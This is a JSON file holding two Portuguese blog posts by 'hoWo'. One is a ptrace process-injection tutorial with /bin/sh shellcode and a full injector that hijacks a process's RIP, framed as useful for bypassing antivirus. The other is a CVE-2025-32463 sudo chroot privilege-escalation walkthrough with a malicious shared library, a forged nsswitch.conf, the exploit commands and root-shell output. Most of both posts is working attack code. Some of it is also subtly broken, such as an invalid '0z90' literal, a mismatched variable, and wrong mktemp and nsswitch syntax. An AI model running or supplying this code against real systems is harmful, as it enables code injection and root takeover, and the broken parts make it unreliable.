[
    {
        "slug": "process-injection-in-linux-using-ptrace",
        "title": "Process Injection no linux com ptrace",
        "desc": "Como injetar shellcode em processos no linux utilizando PTRACE.",
        "author": "hoWo",
        "post_date": "2025-11-11",
        "content": "# Process Injection no Linux usando a biblioteca PTRACE\n\nNeste artigo, vamos aprender sobre injeção de processos (Process Injection) em distribuições linux usando PTRACE\n\n## Shellcode\n\nPrimeiramente, precisamos de um shellcode, neste estudo eu irei utilizar o meu (disponível no [_meu github_](https://github.com/Yyax13/shellcode)).\n\nPara facilitar a compreensão, deixarei o shellcode (em asm) aqui:\n\n```x86asm\nsection .text\nglobal _start\n\n_start:\n    xor rax, rax                        ; rax turns to null byte\n\n    push rax                            ; push \\0 (null byte) to the stack\n    mov rbx, 0x68732f6e69622f           ; '/bin/sh' string\n    push rbx\n\n    mov rdi, rsp                        ; rdi (path) receive rbx ('/bin/sh\\0')\n\n    push rax                            ; null byte (execve require {path, NULL})\n    push rdi                            ; ptr to our path\n    mov rsi, rsp                        ; rsi (argv) receive\n    \n    xor rdx, rdx\n    mov rax, 59\n    \n    syscall\n```\n\nE sua versão em C:\n\n```c\nunsigned char shellcode[] = {\n  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,\n  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,\n  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05\n\n};\n\n```\n\nO .asm já foi documentado em seu próprio repositório, então não iremos perder tempo analisando o mesmo.\n\n## O injector\n\nComeçaremos incluindo tudo que vamos precisar:\n\n```c\n#include <stdio.h>          // printf\n#include <stdlib.h>         // NULL\n#include <unistd.h>         // getpid e qualquer outra coisa\n#include <errno.h>          // erros\n#include <sys/ptrace.h>     // a biblioteca ptrace\n#include <sys/wait.h>       // waitpid\n#include <sys/user.h>       // type user_regs_struct\n#include <sys/types.h>      // pid_t\n\n```\n\nE inserir nosso shellcode:\n\n```c\nunsigned char shellcode[] = {\n  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,\n  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,\n  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05\n\n};\n\nsize_t shellcodeLen = sizeof(shellcode);\n```\n\nApós isso, nós já podemos iniciar a função principal (se você quiser, nada te impede de criar uma função para fazer a injeção, mas para facilitar o entendimento, faremos tudo na main):\n\n```c\nint main(int argc, char *argv[])\n```\n\nO parâmetro `argc` conta a quantidade de argumentos passados na hora de executar o programa, e o `argv` é um array de strings que contém os argumentos (o primeiro argumento sempre será o nome do programa).\n\n### Parse do PID inserido pelo usuário\n\nPara _parsear_ o PID, precisamos verificar se o usuário inseriu o PID corretamente:\n\n```c\nif (argc != 2) { // Se argc for menos de 2 args (primeiro é o caminho do binário)\n    printf(\"Usage: %s <pid>\\n\", argv[0]); // Printa o jeito correto de utilizar \n    return 1; // Retorna 1 (shell interpreta como um erro)\n\n}\n\npid_t procID = (pid_t)atoi(argv[1]); // Atoi converte argv[1] para int, e depois fazemos cast para pid_t (atoi é inseguro, o ideal é usar strtol)\nif (procID <= 0) { // Se o PID for inválido\n    fprintf(stderr, \"Invalid PID\\n\", argv[1]); // Print o erro\n    return 1; // Retorna 1 (erro)\n\n}\n```\n\nApós isso nós já temos o PID do processo que iremos injetar o shellcode, se você quiser, pode verificar se o processo realmente existe.\n\n### Anexando ao processo alvo com PTRACE_ATTACH\n\nApós validar o PID, precisamos anexar ao processo alvo.<br>\n\n> Anexar um processo pode pedir permissões de root, [este artigo](https://www.kernel.org/doc/Documentation/security/Yama.txt?utm_source=https://github.com/Yyax13/proc_injection) explica como você pode verificar isso.\n\n```c\n// Anexa ao processo se baseando no PID e verifica por erros (retorno -1 é um erro)\nif (ptrace(PTRACE_ATTACH, procID, NULL, NULL) == -1) {\n    perror(\"Can't attach\"); // perror printa algo como: \"Can't attach: uau, eu sou a mensagem de erro\"\n    return 1; // Encerra o programa\n\n}\n```\n\n### Aguardando o processo\n\nAgora, precisamos parar o processo alvo, se não, nós não poderemos sobreescrever o RIP do processo.\n\nNós podemos pará-lo usando waitpid e argumentos: `PID, int *status`.\n\n```c\n// Espera o processo parar\nint status;\nif (waitpid(procID, &status, 0) == -1) { // Este 0 pode ser NULL também\n    perror(\"Can't wait for the target\");\n    goto detach; // Vai para o label detach se algum erro ocorrer\n\n}\n```\n\nE verificamos se tudo está bem:\n\n```c\n// Verifica se o processo parou com sucesso\nif (!WIFSTOPPED(status)) { // WIFSTOPPED expande para (((status) & 0xff) == 0x7f) e verifica se o processo parou\n    fprintf(stderr, \"Target did not stop as expected\\n\");\n    goto detach;\n\n}\n```\n\n### Obtendo os registradores do processo e seu RIP\n\n> Se você não sabe o que são os registradores, você pode ler [este artigo](https://blog.codingconfessions.com/p/linux-context-switching-internals?utm_source=https://github.com/Yyax13/proc_injection)\n\nAgora, o processo já está parado, então podemos obter algumas informações:\n\n```c\n// Obtém os registradores do processo\nstruct user_regs_struct regs; // Struct que irá armazenar os registradores\nif (ptrace(PTRACE_GETREGS, procID, NULL, &regs) == -1) { // Usa PTRACE_GETREGS com os args procID, NULL, &regs para obter os registradores do processo\n    perror(\"Can't get target regs\");\n    goto detach;\n\n}\n```\n\nAgora, já temos todos os registradores, mas precisamos obter o RIP, e é mais fácil do que obter os registradores:\n\n```c\nunsigned long address = regs.rip; // Apenas obtém o rip da struct regs\nprintf(\"Target RIP: 0x%llx\\n\", (unsigned long long)address); // Loga o RIP\n```\n\n## Sobreescrevendo o RIP\n\nAgora, já podemos sobreescrever o RIP para inserir nosso shellcode malicioso (neste caso, apenas abre o /bin/sh, mas você pode usar um shellcode do metasploit por exemplo):\n\n```c\nsize_t wordSize = sizeof(unsigned long); // Usa sizeof porque algumas arquiteturas de CPU são diferentes de 8\nsize_t nWords = (shellcodeLen + wordSize - 1) / wordSize; // Calcula a quantidade de palavras que precisamos escrever (arredonda para cima)\nfor (size_t i = 0; i < nWords; i++) { // Loop para cada palavra\n    unsigned long data = 0; // Palavra atual\n    size_t base = i * wordSize; // Base é o índice inicial da palavra atual\n\n    // For loop que escreve a palavra byte-a-byte\n    for (size_t ii = 0; ii < wordSize; ii++) {\n        size_t idx = base + ii; // Índice atual\n        unsigned char byte = (idx < shellcodeLen) ? shellcode[idx] : 0z90; // Se o índice for menor que o tamanho do shellcode, obtém o byte do shellcode, senão, obtém 0x90\n        word |= ((unsigned long)byte << (8 * ii)); // Adiciona o byte à palavra (shiftando para a posição correta)\n    \n    }\n\n    /*\n    POKETEXT escreve uma palavra no endereço do processo.\n      No nosso caso, usamos para escrever nossa palavra em address + base (rip + offset atual)\n    */\n   if (ptrace(PTRACE_POKETEXT, procID, (void*)(address + base), (void*)word) == -1) {\n        perror(\"Some error occurred in POKETEXT\");\n        goto detach;\n\n    }\n\n    printf(\"Wrote 0x%lx --> 0x%llx\\n\", word, (unsigned long long)(address + base)); // Log\n\n}\n```\n\n> Se você não sabe o que é uma word, leia [esse artigo](https://www.techtarget.com/whatis/definition/word?utm_source=pornhub.com)<br>\n> Se você não sabe o que é byte order, leia [esse artigo](https://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/?utm_source=roblox.com)<br>\n> Se você não sabe o que << faz, leia [esse artigo](https://www.geeksforgeeks.org/cpp/left-shift-right-shift-operators-c-cpp/?utm_source=xvideos.com)\n\nInejeção concluída! Agora só precisamos desanexar o processo e nos divertir com nossa shell!\n\n### Desanexando o processo\n\nPara este passo final, só precisamos desanexar:\n\n```c\nif (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) { // Bem simples, eu acho que não precisamos explicar isso\n    perror(\"Can't detach target\");\n    return 1;\n\n}\n```\n\n### Tratamento de erros\n\nSe você realmente leu este artigo, você viu `goto detach` algumas vezes, e aqui está o label `detach`:\n\n```c\ndetach: \n    if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) {\n        perror(\"Can't detach target\");\n        \n    }\n\n    return 1;\n```\n\n## Conclusão\n\nInjeção de processos é um tópico muito interessante, e pode ser usado de diversas formas, por exemplo, bypassar alguns AVs ou fazer um processo rodar algo que ele não deveria.\n\n\n![[Demo no tria.ge](https://tria.ge/250929-vfegeaaj8w)](sandbox.png)\n\n---\n\n> Artigo por [@hoWo](https://github.com/Yyax13)<br>\n> Você pode encontrar a versão original deste artigo em inglês [aqui](https://github.com/Yyax13/proc_injection/blob/master/paper.md)\n"
    },
    {
        "slug": "cve-2025-32463",
        "author": "hoWo",
        "desc": "Estudo acerca da CVE 2025-32463",
        "title": "CVE 2025-32463: Privesc no sudo -R",
        "post_date": "2025-11-11",
        "content": "# CVE 2025-32463: Privilege Escalation no sudo -R\n\nOlá, eu sou hoWo e nesse paper aborderamos as nuances da CVE 2025-32463 (também conhecida como \"CHWOOT\")\n\n## Exemplo\n\nPara começar, entenderemos o que é a vulnerabilidade.\nEla ocorre entre as versões 1.9.14 (inclusa) até a 1.9.17 (inclusa), sendo corrigida na versão 1.9.17p1\nA vulnerabilidade consiste em:\n\nCriar um temp dir (mktemp) que segue a estrutura:\n```anot_estrutura\n  /tmp/woot\n  -> /tmp/woot/etc\n     -> /tmp/woot/etc/nsswitch.conf\n\n  -> /tmp/woot/lib\n     -> /tmp/woot/lib/woot.so\n\n```\n\nClaro que não basta apenas sair criando diretórios, temos que seguir um fluxo:\n\n### 1. ***Vamos criar nosso ambiente para executar o exploit*:**\n\n```bash\nmktemp -p /tmp/woot/etc\nmktemp -p /tmp/woot/lib\n\n```\n\nExplicando rapidamente, utilizamos o mktemp para criar um diretório temporário, em `/tmp`. \nA flag `-p` serve para não termos que diretamente criar o `/tmp/woot` e criar o `./etc` e `./lib`, a flag `-p` cria o `/tmp/woot` automaticamente para que possamos focar em criar os sub-diretórios.\nPerceba que criamos `/etc` e `/lib`, simulando um diretório raiz do linux.\n\n### 2. ***Criaremos agora o módulo malicioso*:**\n\nGeralmente criamos esse tipo de coisa em C ou C++, mas eu sou skid então vou utilizar go.\n\n```go\npackage main\n\nimport (\n\t\"C\" // a lib \"C\" nos permite criar o .so (utilizando cgo), e exportar com //export funcname\n\t\"os/exec\"\n\t\"strings\"\n\n)\n\nvar s string = \"/ckq3ggzp\"\nvar ss []string\n\n//export Init\nfunc Init() {\n    for i, v := range s {\n\t    ss = append(ss, string([]rune{v + rune(i)}))\n\n    }\n\n    c := exec.Command(strings.Join(ss, \"\"))\n\tc.Run()\n\t\n}\n\nfunc main() {}\n\n```\n\nPrecisaremos também compilar (e mover) a nossa lib maliciosa:\n\n```bash\ngo build -o woot.so -buildmode=c-shared main.go\nmv woot.so /tmp/woot/lib/woot.so\n\n```\n\nNesse exemplo temos ofuscação simples (para não levar flag por uma string `\"/bin/bash\"`).\nComo prometi, a segui um exemplo em C (gerado por IA):\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n\n// A função __attribute__((constructor)) garante que 'init'\n// seja executada automaticamente quando a biblioteca for carregada.\nvoid __attribute__((constructor)) init()\n{\n    // Executa um shell /bin/sh com os privilégios do processo pai.\n    // Se o processo pai for root (como o sudo comprometido),\n    // você ganha um shell de root.\n    system(\"/bin/sh\");\n\n}\n\n```\n\nE para compilar:\n\n```bash\ngcc -shared -fPIC -o woot.so woot.c\nmv woot.so /tmp/woot/lib/woot.so\n\n```\n\n### 3. ***Criaremos o nsswitch.conf falso*:**\n\nPrecisamos falar para o sistema que ele deve rodar nossa lib maliciosa, mas como fazemos isso??\nSimples, basta manipular o nsswitch, no nosso caso vamos criar um falso no nosso ambiente temporário.\n\nBasta que rodemos:\n\n```bash\necho \"hosts: files nis [NOTFOUND=return] dns\" > /tmp/woot/etc/nsswitch.conf\necho \"passwd files /lib/woot\" >> /tmp/woot/etc/nsswitch.conf\n\n```\n\nO que fizemos? Primeiro adicionamos a linha: `hosts: files ...`, que é apenas a funcionalidade mínima/disfarçe para que o nsswitch funcione minimamente.\nEntão nós adicionamos `passwd files /lib/woot` no final do arquivo, essa é a parte crítica, aqui que nós chamamos a lib maliciosa.\n\n### 4. ***Rodar o exploit*:**\n\nApós todos os passos, o setup para que nós rodemos o exploit, está pronto!\nBasta testar:\n\n```bash\nsudo -R /tmp/woot /usr/bin/id\n\n```\n\nou\n\n```bash\nsudo --chroot /tmp/woot /usr/bin/id\n\n```\n\nE pronto, temos acesso root ao sistema alvo!\nQuando rodamos o comando, o sudo tenta resolver info do user atual (`passwd`) e lerá o `nsswitch.conf` manipulado, que vai carregar a `/tmp/woot.so`.\n\n## Como funciona??\n\n### Entenda o `sudoedit` e `-R`\n\nPara entender a vulnerabilidade em si, primeiro vamos entender como o `sudo` deveria ser utilizado normalmente, como o escopo vulnerável funciona em casos normais.\n\n***sudoedit*:**\n\nO `sudoedit` é uma ferramenta do `sudo` que serve para modificar arquivos mesmo que não tenhamos permissão para isso, só que de uma forma segura.\nO processo é assim:\n\n```mermaid\ngraph LR\n    A[Inicia sudoedit] --> B{Sudoedit invocado}\n    B --> C[Cria cópia temp.]\n    C --> D[Cópia c/ perm. usuário]\n    D --> E[\"Editor abre cópia\"]\n    E --> F[Usuário edita e salva]\n    F --> G{Saiu do editor?}\n    G -- Sim --> H[Verifica modificações]\n    H -- Modificado? --> I[Copia temp. p/ original]\n    I --> J[Cópia c/ ROOT]\n    J --> K[Alterações salvas]\n    H -- Não --> L[Sem alterações]\n    L --> K\n\n```\n\n***--chroot ou -R*:**\n\nA flag `-R` (ou `--chroot`) é uma opção que roda seu comando/binário dentro de um ambiente `chroot` (change root). Basicamente, isso diz para o comando executado, que o `/` (root) é o diretório que você fornecer. O objetivo legítimo era isolar o processo, por motivos de segurança.\nEle funciona desse jeito:\n\n```mermaid\ngraph LR\n    A[Executa sudo -R] --> B{Sudo invocado c/ root}\n    B --> C[Sudo processa -R/--chroot]\n    C --> D[\"Executa chroot()\"]\n    D --> E[\"Muda dir. p/ novo root\"]\n    E --> F[\"Executa comando no chroot\"]\n    F --> G[\"Comando isolado no chroot\"]\n    G --> H[Comando finalizado]\n\n```\n\n---\n\n### Erro de lógica = vulnerabilidade\n\nO problema de CVE é que o `sudo` (mais especificamente o `sudoedit` + `--chroot`/`-R`) tem um erro na lógica que prepara o ambiente _antes_ de realmente mudar a raiz.\nQuando o `sudoedit` é chamado junto com o `-R` ou `--chroot`, ele tem que garantir que o ambiente estará compatível com o editor e com outras dependências. Isso inclui garantir que libs e arquivos de configuração estejam disponíveis dentro do ambiente.\n\n### Como a escalada de privilégios funciona\n\nSão vários fatores, e aqui vão os principais:\n\n1. ***Pré-config do env*:** O `sudo` começa a configurar o ambiente isolado, ele tem que garantir que componentes/libs essenciais estejam disponíveis.\nO NSS é responsável pela resolução de: informações como nomes de users, groups e hosts, e ele faz isso com libs dinâmicas (`.so`) que estão no `/etc/nsswitch.conf`.\n\n2. ***Carga de libs fora do sandbox completo*:** A parte crítica é que durante a pré-configuração do ambiente, o `sudo` (que já roda com privilégios do superusuário) não está \"totalmente preso\" ao ambiente isolado.\nEle lê o nosso `nsswitch.conf` e carrega as libs NSS do diretório que o atacante forneceu.\n\n3. ***Má interpretação/resolução de nomes*:** Se um user mal-intencionado prepara um ambiente falso contendo o `/etc/nsswitch.conf` manipulado, esse arquivo pode ter (e provavelmente vai ter) uma configuração forjada (e.g.: na resolução do `passwd` podemos indicar uma lib `.so` que executa algo com permissão de root).\n\n4. ***Execução de código arbitrário*:** Quando o `sudo` tenta resolver qualquer informação dependente do NSS, ele lê o `nsswitch.conf` falso e pode executar, com privilégios elevados, uma lib maliciosa, que pode rodar um binário com o mesmo privilégio elevado.\n\nTL;DR\n\nBasicamente, o `sudo` é \"enganado\" para carregar e executar uma biblioteca maliciosa com privilégios elevados, mas antes de \"entrar completamente\" no ambiente.\n\n## Como você pode testar isso?\n\nAposto 15 kwanzas que você quer testar por conta o CVE 2025-32463, e é isso que vamos fazer agora.\n\n### Clonando o repositório\n\nNão vamos executar o PoC no nosso dispositivo, para isso, vamos utilizar uma máquina (docker) disponível no repositório abaixo:\n\n```bash\ngit clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git\n\n```\n\n### Entrando no ambiente\n\nNosso querido pr0v3rbs fez um Dockerfile com uma máquina vulnerável ao CHWOOT, basta que rodemos o run.sh\n\n```bash\ncd CVE-2025-32463_chwoot\n./run.sh\n\n```\n\n### Testando\n\nPara não termos o trabalho, a máquina já vem com um .sh que faz tudo que ensinei no exemplo, de forma simples, apenas rodamos o .sh e temos acesso root!\n\n```\npwn@f151c56ac100:~$ whoami;groups\npwn\npwn\npwn@f151c56ac100:~$ ./sudo-chwoot.sh \nwoot!\nroot@f151c56ac100:/# whoami;groups\nroot\nroot pwn\nroot@f151c56ac100:/# \n\n```\n\n## Conclão\n\nNesse paper, entendemos como escalar privilégios de maneira até que simples, sem muito esforço, apenas explorando uma vulnerabilidade.\nCaso você fique com qualquer dúvida, sinta-se livre para me contactar no discord: `altof_howosec`!\n\n----------\n\n> Refs:\n[NVD](https://nvd.nist.gov/vuln/detail/cve-2025-32463)\n[Adapta ONE](https://adapta.org/)\n[pr0v3rbs](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)\nTodo o texto é de minha autoria, todos os mermaids foram gerados por IA.\n\n"
    }
]

